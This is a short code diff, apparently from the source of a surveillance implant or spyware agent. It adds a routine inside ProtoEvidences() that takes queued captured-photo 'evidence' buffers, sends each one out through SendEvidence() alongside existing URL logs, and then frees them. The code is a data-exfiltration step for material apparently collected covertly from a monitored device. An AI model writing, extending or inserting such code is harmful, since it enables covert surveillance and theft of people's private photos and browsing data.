@@ -24,6 +24,7 @@
 #include "url.h"
 #include "filesystem.h"
 #include "conf.h"
+#include "photo.h"
 
 #undef _GLOBAL_VERSION_FUNCTIONS_
 #include "version.h"
@@ -461,6 +462,24 @@ BOOL ProtoEvidences()
 				g_lpURLLogs[i].lpBuffer = 0;
 				g_lpURLLogs[i].dwSize = 0;
 				zfree(lpEvBuffer);
+			}
+		}
+	}
+
+	// TODO: any specifc order among evidences enforced?
+	Sleep(100);
+	for (auto i=0; i < MAX_PHOTO_QUEUE; i++)
+	{
+		LPBYTE lpEvBuffer = lpPhotoLogs[i].lpBuffer;
+		DWORD  dwEvSize   = lpPhotoLogs[i].dwSize;
+
+		if (dwEvSize != 0 && lpEvBuffer != NULL)
+		{
+			if (SendEvidence(lpEvBuffer, dwEvSize))
+			{
+				lpPhotoLogs[i].lpBuffer = 0;
+				lpPhotoLogs[i].dwSize = 0;
+				zfree_s(lpEvBuffer);
 			}
 		}
 	}
